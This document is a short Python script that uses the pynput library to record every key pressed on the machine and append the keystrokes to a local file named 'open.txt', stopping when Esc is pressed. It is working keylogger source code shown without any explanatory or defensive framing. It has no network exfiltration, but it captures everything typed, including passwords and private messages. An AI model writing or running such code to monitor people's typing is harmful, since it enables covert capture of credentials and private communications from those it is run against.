import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)
    keys = []

def write_file(keys):
    with open("open.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("shift") > 0:
                pass  
            else:
                f.write(f'[{k}]') 
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
